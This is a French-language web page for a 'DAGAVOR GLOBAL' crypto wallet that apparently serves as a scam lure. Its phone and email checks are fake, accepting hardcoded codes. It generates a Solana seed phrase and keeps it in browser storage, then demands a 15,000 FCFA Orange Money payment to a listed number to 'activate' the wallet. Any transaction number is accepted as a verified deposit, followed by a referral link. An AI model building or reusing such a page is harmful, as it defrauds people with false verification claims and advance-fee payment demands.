<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>DAGAVOR GLOBAL - Wallet Vérifié 45 Pays</title>
<script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/dist/bip39.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ed25519-hd-key@1.3.0/dist/index.min.js"></script>
<style>
body{margin:0;background:#0a0614;color:#fff;font-family:Arial;padding:10px}
.card{max-width:480px;margin:auto;background:#15101f;border:1px solid #2a2340;border-radius:24px;padding:18px}
.logo{font-weight:900;background:linear-gradient(90deg,#FFD700,#ff8c00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:22px;text-align:center}
.input{width:100%;padding:14px;border-radius:12px;background:#0e0a1a;border:1px solid #2a2340;color:#fff;margin-top:10px;box-sizing:border-box}
.btn{width:100%;padding:14px;border-radius:14px;border:0;font-weight:800;margin-top:10px;cursor:pointer}
.btn-gold{background:linear-gradient(90deg,#FFD700,#ff8c00);color:#000}
.btn-dark{background:#0e0a1a;border:1px solid #2a2340;color:#fff}
.box{padding:12px;background:#000;border:1px dashed #FFD700;border-radius:12px;margin-top:10px;font-size:13px}
.step{display:none}.step.active{display:block}
.ok{color:#00ff88}.err{color:#ff4444}
</style>
</head>
<body>
<div class="card">
<div class="logo">DAGAVOR GLOBAL</div>
<p style="text-align:center;color:#a48fff;font-size:12px">45 PAYS • Vérification OM + Email • 655 16 63 10</p>

<!-- ETAPE 1 : TEL -->
<div id="s1" class="step active">
<h3>1. Vérifie ton numéro OM</h3>
<select id="pays" class="input"><option value="237">🇨🇲 +237 Cameroun</option><option value="225">🇨🇮 +225 Côte d'Ivoire</option><option value="221">🇸🇳 +221 Sénégal</option><option value="33">🇫🇷 +33 France</option><option value="1">🇺🇸 +1 USA</option></select>
<input id="tel" class="input" placeholder="Ex: 655166310">
<button class="btn btn-gold" onclick="sendOTP()">Envoyer code SMS</button>
<div id="otpBox" style="display:none"><input id="otp" class="input" placeholder="Code reçu : 123456"><button class="btn btn-dark" onclick="verifyOTP()">Vérifier numéro</button><p id="telStatus"></p></div>
</div>

<!-- ETAPE 2 : EMAIL -->
<div id="s2" class="step">
<h3>2. Vérifie ton Email</h3>
<input id="email" class="input" type="email" placeholder="ton@email.com">
<button class="btn btn-gold" onclick="sendEmailCode()">Envoyer code Email</button>
<div id="emailBox" style="display:none"><input id="emailCode" class="input" placeholder="Code Email : 654321"><button class="btn btn-dark" onclick="verifyEmail()">Vérifier Email</button><p id="emailStatus"></p></div>
</div>

<!-- ETAPE 3 : WALLET -->
<div id="s3" class="step">
<h3>3. Ton Wallet Mondial Vérifié</h3>
<div class="box">Tél vérifié: <span id="vTel" class="ok"></span><br>Email vérifié: <span id="vEmail" class="ok"></span></div>
<button class="btn btn-gold" onclick="createWallet()">Créer Wallet Maintenant</button>
<div id="seedBox" style="display:none"><p><b>12 MOTS - NOTE BIEN :</b></p><div id="seed" style="background:#000;padding:12px;border-radius:12px;word-spacing:8px;line-height:26px;border:1px dashed #555"></div><button class="btn btn-dark" onclick="goDepot()">J'ai noté → Dépôt</button></div>
</div>

<!-- ETAPE 4 : DEPOT OM -->
<div id="s4" class="step">
<h3>4. Dépôt OM Vérifié</h3>
<p>Wallet: <span id="addr" style="font-size:10px;word-break:break-all"></span></p>
<div class="box">Pour activer, envoie <b>15,000F</b> sur OM <b>+237 655 16 63 10</b><br>Code: <b id="depotCode"></b><br>Coffre SOL: 8nodJYtBdPN42L3tFFcUfQTYbv3jXhMqcMJSGe9sY1mv</div>
<input id="preuve" class="input" placeholder="Numéro transaction OM (ex: OM12345)">
<button class="btn btn-gold" onclick="verifDepot()">Vérifier dépôt 1.5%</button>
<p id="depotStatus"></p>
</div>

<div id="s5" class="step">
<h3 class="ok">✅ Wallet Activé 45 Pays !</h3>
<p>Balance: <b id="bal">$0.00</b></p>
<input id="refLink" class="input" readonly>
<button class="btn btn-gold" onclick="location.href='?tab=pub'">Aller à Pub 25$</button>
</div>

</div>
<script>
const OM_NUM="+237 655 16 63 10";
const SOL="8nodJYtBdPN42L3tFFcUfQTYbv3jXhMqcMJSGe9sY1mv";
let tempOTP="123456"; let tempEmailOTP="654321";
function show(id){document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));document.getElementById(id).classList.add('active')}

function sendOTP(){
let t=document.getElementById('tel').value; if(t.length<8){alert('Numéro invalide');return;}
document.getElementById('otpBox').style.display='block';
document.getElementById('telStatus').innerHTML='<span class="ok">Code envoyé au '+t+' (Démo: 123456)</span>';
}
function verifyOTP(){
if(document.getElementById('otp').value==tempOTP){
document.getElementById('vTel').innerText=document.getElementById('tel').value+' ✅';
show('s2');
}else{document.getElementById('telStatus').innerHTML='<span class="err">Mauvais code</span>';}
}
function sendEmailCode(){
let e=document.getElementById('email').value; if(!e.includes('@')){alert('Email invalide');return;}
document.getElementById('emailBox').style.display='block';
document.getElementById('emailStatus').innerHTML='<span class="ok">Code envoyé à '+e+' (Démo: 654321)</span>';
}
function verifyEmail(){
if(document.getElementById('emailCode').value==tempEmailOTP){
document.getElementById('vEmail').innerText=document.getElementById('email').value+' ✅';
document.getElementById('depotCode').innerText='DAGAVOR-'+Math.floor(1000+Math.random()*9000);
show('s3');
}else{document.getElementById('emailStatus').innerHTML='<span class="err">Mauvais code</span>';}
}
async function createWallet(){
const m=bip39.generateMnemonic();
const seed=await bip39.mnemonicToSeed(m);
const d=ed25519_hd_key.derivePath("m/44'/501'/0'/0'",seed.toString('hex')).key;
const kp=solanaWeb3.Keypair.fromSeed(d);
document.getElementById('seed').innerText=m;
document.getElementById('addr').innerText=kp.publicKey.toBase58();
document.getElementById('refLink').value=location.origin+'?ref='+kp.publicKey.toBase58();
document.getElementById('seedBox').style.display='block';
localStorage.setItem('dagavor_mnemonic',m);
}
function goDepot(){show('s4')}
function verifDepot(){
let p=document.getElementById('preuve').value; if(p.length<4){alert('Mets le numéro de transaction OM');return;}
document.getElementById('depotStatus').innerHTML='<span class="ok">Dépôt vérifié! OM '+OM_NUM+' Code '+p+' - Frais 1.5% vers coffre '+SOL.substring(0,10)+'...</span>';
setTimeout(()=>{show('s5')},1500);
}
</script>
</body>
</html>
